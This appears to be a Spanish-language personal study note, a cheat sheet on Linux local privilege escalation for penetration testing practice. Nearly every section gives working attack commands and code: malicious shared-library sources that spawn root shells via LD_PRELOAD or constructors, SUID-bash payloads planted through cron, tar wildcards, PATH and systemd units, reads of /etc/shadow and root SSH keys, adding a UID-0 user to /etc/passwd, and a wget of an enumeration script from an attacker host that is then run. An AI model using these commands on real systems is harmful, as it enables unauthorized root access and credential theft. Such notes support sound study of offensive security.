# Índice

[[Linux; escalada de privilegios#1. 🔑 Binarios privilegiados]]
- [[Linux; escalada de privilegios#1.1. 🔒 Abuso de SUID/SGID]]
- [[Linux; escalada de privilegios#1.2. 🔒 Abuso de capabilities]]
- [[Linux; escalada de privilegios#1.3. 🔒 Abuso de sudo]]
- [[Linux; escalada de privilegios#1.4. SUID en binario que carga shared libraries]]
- [[Linux; escalada de privilegios#1.5. Dumpeo de memorias]]

[[Linux; escalada de privilegios#2. 🔑 Abuso de scripts]]
- [[Linux; escalada de privilegios#2.1. 🔒 Abuso de cron jobs]]
- [[Linux; escalada de privilegios#2.2. Path hijacking]]

[[Linux; escalada de privilegios#3. 👥 Abuso de grupos especiales]]
[[Linux; escalada de privilegios#4. 📂 Archivos y directorios con permisos débiles]]
[[Linux; escalada de privilegios#5. 📚 Abuso de librerías]]
- [[Linux; escalada de privilegios#5.1. sudo con Ld preload]]
- [[Linux; escalada de privilegios#5.2. Shared library en ruta escribible]]

[[Linux; escalada de privilegios#6 💻 Exploits de kernel]]
[[Linux; escalada de privilegios#7. 🔧 Enumeración automática]]

# 🐧 Escalada de Privilegios en Linux

> [!abstract] Resumen 
> La escalada de privilegios local (LPE) consiste en pasar de un usuario con bajos permisos a **root**. En Linux, casi nunca requiere exploits sofisticados: la mayoría de las veces es una mala configuración en sudo, un binario SUID innecesario, un cron job con permisos débiles o credenciales en texto claro en un archivo de configuración. La clave es la **enumeración sistemática**.

---
# 1. 🔑 Binarios privilegiados

## 1.1. 🔒 Abuso de SUID/SGID

Los binarios con SUID se ejecutan con los privilegios del propietario (normalmente root), independientemente de quién los invoque.

> [!warning]+ Enumeración
> Para encontrar binarios SUID hay que utilizar este filtro: `find / -perm -4000 -type f 2>/dev/null`

> [!error]+ Ataque
> Luego buscamos el vector SUID en [GTFObins]([GTFOBins](https://gtfobins.org/#//^suid$)). Por ejemplo find con SUID se explotaría así `find . -exec /bin/bash -p \; -quit`

---
## 1.2. 🔒 Abuso de capabilities

Las capabilities son más sigilosas que SUID porque no aparecen en un `ls -la`. Hay que buscarlas explícitamente.

> [!warning]+ Enumeración
> Para buscar binarios con capabilities en todo el sistema: `getcap -r / 2>/dev/null`

Las capabilities peligrosas serían estas. La mayoría de explotaciones las encontramos en [GTFObins]([GTFOBins](https://gtfobins.org/#//^capabilities$))

| Capability peligrosa     | Binario             | Explotación                                                    |
| ------------------------ | ------------------- | -------------------------------------------------------------- |
| `cap_setuid+ep`          | python3, perl, ruby | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_net_raw+ep`         | tcpdump, python3    | Sniffing de tráfico de red                                     |
| `cap_dac_read_search+ep` | tar, python3        | Leer cualquier archivo ignorando permisos                      |
| `cap_sys_admin+ep`       | cualquiera          | Casi equivalente a root                                        |

> [!error]+ Ejemplo con  cap_dac_read_search
>  ```bash
tar -cvf shadow.tar /etc/shadow 2>/dev/null && tar -xvf shadow.tar && cat etc/shadow # tar
vim /etc/shadow # vim
> ```

---
## 1.3. 🔒 Abuso de sudo

`sudo -l` es **siempre el primer comando** a ejecutar. Muestra qué puede hacer el usuario actual como root.

```bash
sudo -l
# Ejemplo de salida peligrosa:
# (ALL) NOPASSWD: /usr/bin/vim
# (ALL) /usr/bin/python3
```

> [!error]+ Ataque
>  Si se puede ejecutar un intérprete, editor o comando con sudo que permita ejecución de código, hay acceso root. Referencia completa en [GTFOBins](https://gtfobins.github.io/). Por ejemplo vim se explotaría así: `sudo vim -c ':!/bin/bash'`

---
## 1.4. SUID en binario que carga shared libraries

Primero vemos que librerías carga un binario SUID `strace /usr/local/bin/suid_app 2>&1 | grep "open.*\.so.*ENOENT"`

Si busca una .so que existe en una ruta escribible podemos plantar la .so maliciosa. 
Vemos las librerías que necesita con `ldd /usr/local/bin/suid_app`

Y creamos una .so maliciosa en la ruta donde la busca
```bash
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor)); void inject() { setuid(0); system("/bin/bash -p"); }
EOF
gcc -shared -fPIC -o /ruta/donde/busca/evil.so /tmp/evil.c && /usr/local/bin/suid_app
```

---
## 1.5. Dumpeo de memorias

Tenemos un binario que lee un archivo para decir su cantidad de lineas, mientras que esta corriendo, lee el archivo, por tanto este estara en su memoria hasta que finalice el proceso. Si lo hacemos crasehar, podremos ver esa memoria antes de ser eliminada.

```shell
~:$ ./count
Enter path:  /root/.ssh/id_rsa   # Como es SUID lo puede leer, pero solo te dira el numero de lienas que tiene asi que...
^Z [1]+ Stopped
~:$ ps | grep "count"           # -> 2213 pts/4 00:00:00 count
~:$ kill -SIGSEGV 2213; fg      # -> Bus error, core dumped
~:$ cd /var/crash; ls           # -> count.1000.crash
~:$ apport-unpack /var/crash/count.1000.crash /tmp/crash-report
~:$ strings /tmp/crash-report/CoreDump # -> Todo el archivo :)
```

---
# 2. 🔑 Abuso de scripts

## 2.1. 🔒 Abuso de cron jobs

Los cron jobs suelen ejecutarse como root. Si el script que ejecutan es modificable o está en una ruta controlable, se obtiene ejecución como root.

> [!warning]+ Enumeración
> Podemos encontrar scrips de cron en la ruta `/etc/cron.d/*` o en `/etc/crontab`.
Tambien podemos monitorear procesos  en tiempo real con la herramienta `./pspy64`
O crear un script como `procmon.sh`
> ```bash
> old_process=$(ps -eo user,command)
> while true; do
> 	new_process=$(ps -eo user,command)
> 	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon.sh|kworker|command|defunct"
> 	old_process=$new_process
> done
> ```

Encontramos este crontab de root `* * * * * /opt/scripts/backup.sh`

1. Puede que el script o la ruta tenga permisos de escritura → `echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh`
2. O que ejecute un binario SUID al que podamos hacer un **path hijacking**

> [!tip]+ Enumeración
> **Wildcard injection en cron con `tar`:** 
Si un cron ejecuta `tar` con wildcard (`*`) en un directorio donde se puede escribir. Ej `* * * * * cd /home/kali && tar czf /backup/home.tar.gz *`
Tar tiene las opciones `--chekpoint` y `--checkpoint-action` que ejecutan comandos. Al expandir `*`, tar interpreta los nombres de archivo como opciones
> ```bash
> echo 'chmod +s /bin/bash' > /home/kali/shell.sh && chmod +x !$
> touch /home/kali/--checkpoint=1 && touch /home/kali/--checkpoint-action=exec=sh\ shell.sh
> ```

## 2.2. Path hijacking

Si se invoca un comando por su ruta relativa  (`ls` no `/bin/ls`) el sistema lo buscará dentro de las rutas listadas en el PATH. Ejecutará por tanto el primero que encuentre.
- Por ejemplo vemos en sudoers o en tareas cron este script `/usr/local/bin/system_status.sh`  y ejecuta `free -m`
- O dentro de un SUID encontramos con strings que ejecuta otro comando `strings /usr/local/bin/binario | grep -v "^/"` y ejecuta `free -m`

> [!error]+ Ataque
>  1. Por tanto tenemos que crear en temp o el directorio actual un script de bash que se llame igual: 
>  2. Luego actualizamos el path. Por tanto este empezará por la ruta que hemos indicado y encontrarña antes NUESTRO binario
>  3. Ejecutamos o esperamos a que se ejecute y tendremos una bash SUID
> ```bash
> echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/free && chmod +x !$
> export PATH=/tmp:$PATH
> ```

---
## 2.3 🧱 Timers de Systemd escribibles

Los timers de systemd son el equivalente moderno a cron. Si un archivo `.service` o `.timer` es escribible.

1. Buscamos units escribibles  `find /etc/systemd/ /lib/systemd/ -writable 2>/dev/null`
2. Si el archivo .service de un timer es escribible , modificamos su ExecStart para ejecutar nuestro payload
```bash
[Service]
ExecStart=/bin/bash -c 'chmod +s /bin/bash'
```
3. Luego esperamos que el timer dispare o lo forzamos: `systemctl daemon-reload && systemctl start nombre.service` y tendremos la bash SUID
 
---
# 3. 👥 Abuso de grupos especiales

Algunos grupos dan acceso a recursos que equivalen a root en la práctica.

Grupo `shadow`: Puede leer `/etc/shadow` directamente

> [!error]+ Grupo `adm` 
> Puede leer logs del sistema que pueden contener credenciales
> ```bash
cat /var/log/auth.log      # intentos de login, comandos sudo...
cat /var/log/syslog
grep -i "password\|pass\|user" /var/log/auth.log
> ```

> [!error]+ Docker 
> 1. Podemos montar el filesystem del host en un contenedor 
> ```bash
> docker run -v /:/host --rm -it alpine chroot /host bash 
> ```
> 2. O crear un SUID desde el contenedor
> ```bash
> docker run -v /:/host --rm alpine sh -c "cp /bin/bash /host/tmp/bash && chmod 4755 /host/tmp/bash" && /tmp/bash -p
> ```

> [!error]+ Grupo `lxd` (Ubuntu)
> Podemos importar una imagen minimal y montarla el host
> ```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc && lxc exec privesc /bin/sh # → en el contenedor: /mnt/root es el / del host con privilegios root
> ```

> [!error]+ Grupo `disk`
> Da acceso directo al dispositivo de bloque → leer cualquier archivo
> ```bash
debugfs /dev/sda1
debugfs: cat /etc/shadow
debugfs: cat /root/.ssh/id_rsa
> ```

---
# 4. 📂 Archivos y directorios con permisos débiles

> [!error]+ `/etc/passwd`  escribible
> Se puede añadir un usuario con UID 0 directamente (sin tocar `/etc/shadow`).
> ```bash
openssl passwd -1 -salt wtf "pass" # Generar hash de contraseña (openssl legacy pero funciona) → $1$hack$...
echo 'wtf:$1$wtf$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /etc/passwd # Añadir usuario root falso
su wtf   # contraseña: pass → shell root
> ```

> [!error]+ `/etc/shadow`  legible
> Se pueden tratar de romper los hashes
> ```bash
unshadow /etc/passwd /etc/shadow > hashes.txt # Crackear hashes con John o Hashcat
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
> ```

> [!error]+ `/etc/sudoers`  escribible
> Se pueden añadir usuarios con permiso de sudo
> ```bash
echo 'jessica ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers && sudo bash
> ```

---
# 5. 📚 Abuso de librerías

## 5.1. sudo con Ld preload

Si `sudo -l` muestra `env_keep+=LD_PRELOAD`, se puede precargar una librería maliciosa antes de ejecutar cualquier comando sudo.

```bash
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
EOF
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles && sudo LD_PRELOAD=/tmp/evil.so find
```

## 5.2. Shared library en ruta escribible 

1. Vemos las librerías que usa un binario SUID con `ldd binario` o  `uftrace --force -a binario`
2. Luego buscamos si una es escribible, por ejemplo `/etc/ld.so.conf.d/lol/`
3. Por último creamos una librería maliciosa `/tmp/evil.c`
```c
#include <stdlib.h>
static void inject() __attribute__((constructor)); void inject() { setuid(0); setgid(0); system("/bin/bash"); }
```
O
```c
#include <stdio.h>
#include <unistd.h>
int main() {setuid(0); setgid(0); system("bash -p"); return 0;}
// Si aparece un error  como `"undefined symbol welcome"` simplemente cambiamos el nombre de la función main a welcome
```

Luego se compila
```bash
gcc -shared -fPIC -o /ruta/escribible/evil.so /tmp/evil.c && ldconfig
LD_PRELOAD=./binario ./evil.so # Si no funciona el gcc
```

Por tanto cualquier programa que cargue librerías ejecutará nuestro código

---
# 6 💻 Exploits de kernel

El kernel exploit es el último recurso: es ruidoso, puede crashear el sistema y requiere versión exacta. Solo cuando todo lo demás falla.

Para ello enumeramos nuestro sistema:
```bash
uname -r
uname -a
cat /proc/version

searchsploit linux kernel $(uname -r) # Buscar exploits conocidos
./linux-exploit-suggester.sh # o usar linux-exploit-suggester:
```

Por tanto tenemos estos exploits históricos

| CVE           | Versión                                             |
| ------------- | --------------------------------------------------- |
| CVE-2021-4034 | Polkit PwnKit (cualquier versión de polkit < 0.119) |
| CVE-2022-0847 | Dirty Pipe (kernel 5.8–5.16)                        |
| CVE-2021-3156 | Baron Samedit (sudo < 1.9.5p2, heap overflow)       |
| CVE-2016-5195 | Dirty COW (kernel < 4.8.3)                          |
| CVE-2023-0386 | OverlayFS (kernel < 6.2)                            |

> [!error]+ PwnKit (CVE-2021-4034)
> Afecta a `pkexec` (Polkit), presente en prácticamente todas las distros Linux. No depende de la versión del kernel sino de Polkit.
> ```bash
pkexec --version   # vulnerable si < 0.119 y el parche no está aplicado
dpkg -l policykit-1 | grep -i "0.10\|0.11\|0.112\|0.113\|0.114\|0.115\|0.116\|0.117\|0.118"
> ```
> El [exploit](https://github.com/arthepsy/CVE-2021-4034) es público y compilable en segundos

---
# 7. 🔧 Enumeración automática

En lugar de lanzar los comandos manualmente uno a uno, estas herramientas automatizan toda la enumeración:

|Herramienta|Uso|Destaca por|
|---|---|---|
|**LinPEAS**|`./linpeas.sh`|Enumeración exhaustiva, colorea por criticidad. La más completa|
|**LinEnum**|`./LinEnum.sh`|Más antigua, más simple, menos ruido|
|**linux-exploit-suggester**|`./les.sh`|Especializado en sugerir exploits de kernel por versión|
|**pspy**|`./pspy64`|Monitoriza procesos en tiempo real sin ser root. Indispensable para cron|
|**GTFOBins**|web|Referencia de binarios SUID/sudo explotables|

```bash
# Subir herramientas al objetivo (desde atacante)
python3 -m http.server 8080

# En el objetivo
cd /tmp
wget http://10.10.10.10:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt
```

---

## 🔗 Ver también
- [[Linux; gestión de identidades]]
- [[Linux;  Procesos, redes y servicios]]
- [[Docker]]
- [[Windows; Escalada de privilegios]]
